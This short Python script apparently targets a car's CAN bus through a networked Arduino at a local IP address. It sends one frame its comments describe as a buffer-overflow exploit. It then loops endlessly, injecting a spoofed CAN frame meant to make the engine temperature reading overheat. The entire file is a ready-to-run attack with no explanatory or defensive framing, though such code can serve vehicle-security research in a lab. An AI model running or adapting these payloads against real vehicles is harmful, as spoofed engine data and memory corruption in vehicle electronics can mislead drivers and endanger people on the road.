import socket
import sys


#STATIC IP OF THE CAN ARDUNIO
host = '192.168.1.177';
#PORT
port = 8888;

# create dgram udp socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print ('Sucessful socket Connection ')
except socket.error:
    print ('Failed to create socket')
    sys.exit()

#SENDING THE EXPLOIT TO MAKE BUFFER OVERFLOW AND APPENIDNG IN THE END
# THE 3 FRIST CHARACTORS OF THE FRAME 8802 FOLLOWED BY PAYLOAD
s.sendto(b'5a0#00fa0f0000630eeb00fa0f0000630eeb8802', (host, port))

while(1) :
    try :
        #sending payload to make the  engine temperature overheat
        s.sendto(b'288#33ed000000585288', (host, port))
    except socket.error:
        print ('Error Code : ' + str(socket.error))
        sys.exit()
